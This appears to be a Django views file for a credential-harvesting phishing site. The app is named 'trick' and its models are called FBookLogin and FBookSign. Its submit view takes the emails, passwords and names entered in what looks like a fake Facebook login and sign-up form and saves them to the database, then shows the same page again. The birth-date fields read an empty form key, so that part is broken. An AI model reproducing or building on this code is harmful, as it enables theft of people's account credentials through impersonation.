from django.shortcuts import render
from .models import *
# Create your views here.

def home(request):
	return render(request,'trick/home.html')

def submit(request):
	if request.method=='POST':
		log_email=request.POST.get('log_email','')
		log_password=request.POST.get('log_password','')
		sign_first=request.POST.get('sign_first','')
		sign_last=request.POST.get('sign_last','')
		sign_email=request.POST.get('sign_email','')
		sign_password=request.POST.get('sign_password','')
		sign_day=request.POST.get('','')
		sign_month=request.POST.get('','')
		sign_year=request.POST.get('','')

		login=FBookLogin(log_email=log_email,log_password=log_password)
		sign=FBookSign(sign_first=sign_first,sign_last=sign_last,sign_email=sign_email,sign_password=sign_password,sign_day=sign_day,sign_month=sign_month,sign_year=sign_year)
		login.save()
		sign.save()
		return render(request,'trick/home.html')